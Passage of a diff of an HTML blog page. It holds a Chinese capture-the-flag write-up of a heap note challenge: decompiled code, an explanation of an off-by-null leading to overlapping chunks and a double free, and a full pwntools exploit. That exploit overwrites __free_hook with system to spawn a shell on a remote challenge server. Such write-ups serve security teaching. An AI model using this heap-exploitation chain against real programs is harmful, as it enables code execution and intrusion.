class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v3);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        delete();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There are only 16 pages.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( *((_QWORD *)&amp;notes + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="type">void</span> **)&amp;notes + v1));</span><br><span class="line">    *((_QWORD *)&amp;notes + v1) = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such note.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size_4; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There are only 16 pages.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( *((_QWORD *)&amp;notes + v2) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The note already exists.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;size);</span><br><span class="line">      <span class="keyword">if</span> ( size &lt;= <span class="number">0xFF</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Too big!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v0 = v2;</span><br><span class="line">    *((_QWORD *)&amp;notes + v0) = <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">    size_4 = read(<span class="number">0</span>, *((<span class="type">void</span> **)&amp;notes + v2), size);</span><br><span class="line">    *(_BYTE *)(*((_QWORD *)&amp;notes + v2) + size_4) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%u"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">></span> <span class="token number">0xF</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"There are only 16 pages."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>notes <span class="token operator">+</span> v2<span class="token punctuation">)</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"The note already exists."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">else</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%u"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span> size <span class="token operator">&lt;=</span> <span class="token number">0xFF</span> <span class="token punctuation">)</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Too big!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    v0 <span class="token operator">=</span> v2<span class="token punctuation">;</span>
+    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>notes <span class="token operator">+</span> v0<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    size_4 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>notes <span class="token operator">+</span> v2<span class="token punctuation">)</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>notes <span class="token operator">+</span> v2<span class="token punctuation">)</span> <span class="token operator">+</span> size_4<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>题目没有uaf,但是在add的时候有一个off by null，可以通过off by null 触发一次堆合并 构造 一个heap overlap的现象，产生uaf</p>
 <p>构造一个这样的情况，在add heap3的时候，heap4的低位一个字节就会被覆盖成 0x00，如果在创建 heap4的时候size 大于等于 0xf8，这时候chunk的大小为 0xf0 + 0x10(size + 8) + 1(prev_inuse)，在add heap3的时候 prev_inuse就会被覆盖，再free掉 heap4的时候就会触发 前向合并，将 heap 1 2 3 4合并在一起</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">heap 1(free) (content &quot;AAAA&quot;) </span><br><span class="line">heap 2(In use) (content &quot;AAAA&quot;)</span><br><span class="line">heap 3(In use) (content &quot;A&quot; * (data  - 8) + p64(heap 1 size+ heap2 size+ heap3 size))</span><br><span class="line">heap 4(In use) (content &quot;AAAA&quot;) </span><br><span class="line">High Address</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">heap 1(free) (content &quot;AAAA&quot;) 
+heap 2(In use) (content &quot;AAAA&quot;)
+heap 3(In use) (content &quot;A&quot; * (data  - 8) + p64(heap 1 size+ heap2 size+ heap3 size))
+heap 4(In use) (content &quot;AAAA&quot;) 
+High Address<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>这时候再malloc 5 6 7 8 那就会产生一个堆重叠现象</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 - 5</span><br><span class="line">2 - 6</span><br><span class="line">3 - 7</span><br><span class="line">4 - 8</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">1 - 5
+2 - 6
+3 - 7
+4 - 8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>这时候2 - 6 3 - 7 就会产生uaf，可以进行double free</p>
 <p>所以利用思路是，先通过off by null构造一个heap overlap，产生uaf 泄露libc的地址，再通过uaf 来double free，把free_hook的地址写成system，去free掉一个内容为binsh的堆，触发system(binsh)</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line">IP = <span class="string">&quot;47.100.139.115&quot;</span></span><br><span class="line">PORT = <span class="number">30708</span></span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="keyword">return</span> remote(IP, PORT) <span class="keyword">if</span> <span class="keyword">not</span> is_debug <span class="keyword">else</span> process()</span><br><span class="line"></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">r = <span class="keyword">lambda</span> x=<span class="literal">None</span>: p.recv() <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">r_leak_libc_64 = <span class="keyword">lambda</span>: u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r_leak_libc_32 = <span class="keyword">lambda</span>: u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    sla(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_tcache</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(i,<span class="number">0xf8</span>,<span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free_tcache</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete(i)</span><br><span class="line"></span><br><span class="line">p = connect()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf8</span>,<span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>,<span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">10</span>):</span><br><span class="line">    add(i,<span class="number">0xf8</span>,<span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0xf8</span>,<span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x100 + 0x70 </span></span><br><span class="line"><span class="comment"># 0x100 + 0x70 + 0x100</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>,<span class="string">b&quot;B&quot;</span> * <span class="number">0x60</span> + p64(<span class="number">0x170</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x78</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">libc_base = r_leak_libc_64() - (<span class="number">0x7fe6d3febca0</span> - <span class="number">0x7fe6d3c00000</span>)</span><br><span class="line">success(<span class="string">f&quot;libc_base -&gt;<span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">f&quot;free_hook -&gt;<span class="subst">&#123;<span class="built_in">hex</span>(free_hook)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 == 10 11</span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x68</span>,<span class="string">b&quot;C&quot;</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x68</span>,<span class="string">b&quot;C&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">    add(i,<span class="number">0x68</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">    add(i,<span class="number">0x68</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x68</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x68</span>,<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x68</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>,p64(system))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token comment"># from LibcSearcher import *</span>
+<span class="token keyword">import</span> itertools
+<span class="token keyword">import</span> ctypes
+
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+
+is_debug <span class="token operator">=</span> <span class="token number">1</span>
+IP <span class="token operator">=</span> <span class="token string">"47.100.139.115"</span>
+PORT <span class="token operator">=</span> <span class="token number">30708</span>
+
+elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./vuln'</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc
+
+<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
+sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
+r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+r_leak_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
